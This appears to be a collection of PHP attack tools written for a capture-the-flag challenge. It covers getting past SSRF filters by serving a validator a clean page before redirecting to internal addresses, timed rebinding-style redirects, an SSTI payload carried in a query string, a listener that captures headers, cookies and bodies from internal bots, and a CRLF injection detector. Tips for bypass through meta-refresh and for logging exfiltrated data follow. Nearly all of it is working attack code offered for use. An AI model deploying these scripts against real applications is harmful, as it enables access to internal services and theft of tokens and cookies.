
### 1. The "Smart" Redirector (Bypass SSRF/TTL Filters)
This script is designed to fool an application that checks a URL twice (TOCTOU). It serves a "clean" page the first time it is hit (to pass validation) and redirects to the "malicious" target the second time it is hit.

```php
<?php
// smart_redirect.php
session_start();

if (!isset($_SESSION['visited'])) {
    // First hit: Serve clean content to satisfy 'url_check' or status checks
    $_SESSION['visited'] = true;
    http_response_code(200);
    echo "<html><body>Clean Page for Validator</body></html>";
} else {
    // Second hit: The actual worker (Selenium/Bot) hits this and gets redirected
    header("Location: http://127.0.0.1:5000/logs");
    // Alternative for SSTI:
    // header("Location: http://google.com/?x={logify.__globals__}");
    exit();
}
?>
```

### 2. The Request Logger (Exfiltration Listener)
Use this when you want to see exactly what an internal bot is sending (User-Agents, Cookies, or Internal Headers).

```php
<?php
// logger.php
$log_file = 'requests.log';
$data = "--- New Request ---\n";
$data .= "Time: " . date('Y-m-d H:i:s') . "\n";
$data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= "Method: " . $_SERVER['REQUEST_METHOD'] . "\n";
$data .= "Headers: " . json_encode(getallheaders()) . "\n";
$data .= "Query: " . $_SERVER['QUERY_STRING'] . "\n";
$data .= "Body: " . file_get_contents('php://input') . "\n\n";

file_put_contents($log_file, $data, FILE_APPEND);
echo "OK";
?>
```

### 3. DNS Rebinding Simulator
If a filter checks the IP of your domain, you can use a PHP script to simulate "rebinding" behavior by changing the redirect target based on timing.

```php
<?php
// rebind_proxy.php
// If the request comes within the first 10 seconds of the minute, go to Google (Clean)
// If it comes after, go to 127.0.0.1 (Internal)
if (intval(date('s')) < 30) {
    header("Location: http://www.google.com");
} else {
    header("Location: http://127.0.0.1:5000/bartender");
}
?>
```

### 4. The "Check_Equiv" Bypass (Self-Referential)
As we saw in the challenge, some apps check if `final_url == original_url`. You can bypass this by redirecting to a sub-path on your own domain that contains the payload.

```php
<?php
// equiv_bypass.php
$my_url = "http://basestar.cloudmega.net:8080/equiv_bypass.php";

if (!isset($_GET['payload'])) {
    // Redirect to self with the payload in the query string
    // This keeps the HOST the same, which often passes 'check_equiv'
    header("Location: " . $my_url . "?payload={logify.__globals__}");
    exit();
}

// Once redirected, serve actual content
echo "<html><body>Payload is in the URL fragment/query: " . htmlspecialchars($_GET['payload']) . "</body></html>";
?>
```

### 5. Header Injection Tester
Sometimes SSRF can be used to inject headers into an internal request. This listener helps you identify if a CRLF (`%0d%0a`) injection is working.

```php
<?php
// crlf_detector.php
$headers = getallheaders();
foreach ($headers as $name => $value) {
    // If we see a header that shouldn't be there, we've achieved injection
    if (strpos($name, 'X-Injected') !== false) {
        file_put_contents('vuln.txt', "CRLF Injection Success: $name\n", FILE_APPEND);
    }
}
?>
```

### Pro-Tips for PHP Listeners:

1.  **Run with built-in server**: You don't need Apache/Nginx for research. Just run:
    `php -S 0.0.0.0:8080`
2.  **Use `getallheaders()`**: This is specific to PHP and is the fastest way to see if the internal bot is passing along sensitive internal tokens or cookies.
3.  **Bypass Regex with Encoding**: If a filter blocks `Location:`, you can sometimes use meta-refreshes in the HTML body:
    ```html
    <meta http-equiv="refresh" content="0;url=http://127.0.0.1:5000/logs">
    ```
4.  **Silent Logging**: When exfiltrating data (like a flag), use `file_put_contents` with `FILE_APPEND` so you don't lose data if multiple requests hit your server at once.

